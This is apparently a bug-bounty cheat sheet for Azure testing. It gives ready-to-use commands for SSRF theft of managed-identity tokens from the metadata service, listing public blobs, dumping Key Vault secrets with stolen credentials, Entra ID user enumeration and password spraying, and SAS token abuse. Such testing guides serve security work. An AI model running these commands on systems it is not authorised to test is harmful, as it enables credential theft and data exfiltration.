# Azure Security Testing

> Azure's widespread enterprise adoption means misconfigured storage and identity is extremely common in large bug bounty programs.

---

## Recon — Finding Azure Assets

```bash
# Enumerate Azure subdomains
# Common patterns:
companyname.blob.core.windows.net      # Blob Storage
companyname.azurewebsites.net          # App Service
companyname.azurefd.net                # Front Door CDN
companyname.onmicrosoft.com            # Azure AD tenant
companyname.vault.azure.net            # Key Vault
companyname.database.windows.net       # SQL Database
companyname.redis.cache.windows.net    # Redis Cache
companyname.servicebus.windows.net     # Service Bus

# Automated enumeration
python3 cloud_enum.py -k companyname --disable-aws --disable-gcp

# Azure tenant discovery
curl -s "https://login.microsoftonline.com/companyname.onmicrosoft.com/.well-known/openid-configuration" | jq .

# Find tenant ID
curl -s "https://login.microsoftonline.com/companyname.com/.well-known/openid-configuration" | jq .issuer
```

---

## Azure Blob Storage Testing

```bash
# Blob storage URL format
https://ACCOUNT.blob.core.windows.net/CONTAINER/FILE

# Check if container is publicly accessible
curl -s "https://account.blob.core.windows.net/container?restype=container&comp=list"

# List blobs in public container
curl -s "https://account.blob.core.windows.net/\$root?restype=container&comp=list&prefix="

# Download a blob
curl -s "https://account.blob.core.windows.net/container/file.txt" -o file.txt

# AzBlobStorage scanner
python3 BlobHunter.py -a accountname

# Common sensitive file patterns to look for
.env, config.json, web.config, appsettings.json, database.sql,
id_rsa, *.pem, *.key, backup.zip, secrets.xml, credentials.json
```

---

## SSRF → Azure Instance Metadata Service (IMDS)

```bash
# Azure IMDS endpoint
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Requires header: Metadata: true
# (inject via SSRF if server forwards headers, or try without)

# Identity token (managed identity credentials)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Storage access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/

# Key Vault access token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net

# Instance info (no special header needed in some configs)
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01

# Attacker-controlled header injection
# If SSRF allows custom headers:
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## Using Stolen Azure Credentials

```bash
# Login with stolen token
az login --use-device-code
# Or use service principal
az login --service-principal -u CLIENT_ID -p CLIENT_SECRET --tenant TENANT_ID

# With access token directly
az account get-access-token
# Use TOKEN in API calls:
curl -H "Authorization: Bearer TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Who am I?
az account show
az ad signed-in-user show

# List subscriptions
az account list

# List resource groups
az group list --output table

# List all resources
az resource list --output table

# List storage accounts
az storage account list --output table

# List key vaults
az keyvault list --output table

# Get secrets from Key Vault
az keyvault secret list --vault-name VAULT-NAME
az keyvault secret show --vault-name VAULT-NAME --name SECRET-NAME

# List App Services
az webapp list --output table

# List Function Apps
az functionapp list --output table

# List SQL servers
az sql server list --output table

# List VMs
az vm list --output table
```

---

## Azure AD / Entra ID Testing

```bash
# Enumerate Azure AD users (if tenant allows)
curl -s "https://login.microsoftonline.com/companyname.com/openid/userinfo"

# User enumeration via login endpoint
# Valid user = "AADSTS50126: Invalid username or password"
# Invalid user = "AADSTS50034: The user account does not exist"

# Password spray (carefully — lockout risk)
# Use MSOLSpray or Spray365

# Enumerate tenant information
curl -s "https://login.microsoftonline.com/companyname.com/.well-known/openid-configuration"

# Find all users in tenant (requires auth)
az ad user list --output table

# Check guest access settings
az ad policy show --id B2C_1_signupsignin | jq .
```

---

## Common Azure Misconfigurations

**Public Blob Storage container with sensitive data** → Critical/High

**Managed Identity + SSRF → access token theft** → Critical

**Key Vault accessible without network restrictions** → High

**App Service with exposed Kudu console (`/scm/`)** → High/Critical

**Storage account with `AllowBlobPublicAccess: true`** → High

**Azure AD guest access enabled with over-permissive roles** → High

**Shared Access Signature (SAS) tokens in URLs or JS** → High

**Azure Function with anonymous HTTP trigger exposing sensitive operations** → High

---

## SAS Token Abuse

```bash
# SAS tokens grant time-limited access to Azure Storage
# Format: ?sv=2020-08-04&ss=b&srt=co&sp=rwdlacuptfx&...

# Check SAS token permissions
# sp=r   → read
# sp=w   → write
# sp=d   → delete
# sp=rwdlacuptfx → full permissions

# If SAS token found in URL/JS/git:
# List containers
az storage blob list --container-name CONTAINER \
  --account-name ACCOUNT \
  --sas-token "?sv=..."

# Download files
az storage blob download --container-name CONTAINER \
  --name FILE --file local.txt \
  --account-name ACCOUNT \
  --sas-token "?sv=..."
```
